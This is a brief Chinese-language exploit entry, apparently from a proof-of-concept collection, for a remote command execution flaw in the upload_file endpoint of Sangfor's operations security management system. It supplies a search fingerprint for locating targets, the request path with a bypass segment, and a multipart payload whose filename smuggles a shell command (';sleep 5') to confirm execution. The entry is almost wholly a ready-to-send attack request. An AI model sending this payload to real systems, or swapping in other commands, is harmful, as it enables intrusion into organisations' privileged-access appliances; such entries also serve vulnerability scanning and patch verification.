# 深信服运维安全管理系统upload_file存在远程命令执行漏洞

深信服 ｜ 命令执行 ｜ —
- **指纹**：`body="/fort/login"`
- **请求**：`POST /fort/cssp;help/v1/app/upload_file HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="Universal_OSMv3.0_12340101;sleep 5"
123
------WebKitFormBoundary--
```
- **响应特征**：200